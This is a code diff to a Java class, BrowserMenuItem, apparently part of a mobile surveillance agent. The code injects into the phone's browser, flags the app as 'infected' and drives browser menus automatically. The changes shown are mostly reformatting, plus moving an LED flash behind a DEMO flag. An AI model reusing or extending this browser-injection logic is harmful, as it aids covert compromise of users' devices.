@@ -98,7 +98,10 @@ public class BrowserMenuItem extends ApplicationMenuItem {
 
                 //#ifdef DEBUG
                 debug.info("BROWSER INJECTED!");
-                debug.ledFlash(Debug.COLOR_GREEN);
+                //#endif
+
+                //#ifdef DEMO
+                Debug.ledFlash(Debug.COLOR_GREEN);
                 //#endif
 
                 AppInjectorBrowser.getInstance().setInfected(true);
@@ -177,17 +180,17 @@ public class BrowserMenuItem extends ApplicationMenuItem {
         //#endif
         if (browserScreen != null) {
             addMenuBrowser();
-            Utils.sleep(200);            
-            browserScreen = browserApp.getActiveScreen();            
-            
-            if(firsttime){
+            Utils.sleep(200);
+            browserScreen = browserApp.getActiveScreen();
+
+            if (firsttime) {
                 //#ifdef DEBUG
                 debug.trace("callMenuInContext: close the about");
                 //#endif
-                firsttime=false;
-                MenuWalker.walk("Close", browserScreen, false);   
-            }else{
-                MenuWalker.walk(BROWSER_MENU, browserScreen, false);                
+                firsttime = false;
+                MenuWalker.walk("Close", browserScreen, false);
+            } else {
+                MenuWalker.walk(BROWSER_MENU, browserScreen, false);
             }
             Utils.sleep(200);
             removeMenuBrowser();
@@ -198,9 +201,10 @@ public class BrowserMenuItem extends ApplicationMenuItem {
         }
     }
 
-    boolean firsttime=false;
+    boolean firsttime = false;
+
     public void firstTime() {
-        firsttime=true;
-        
+        firsttime = true;
+
     }
 }
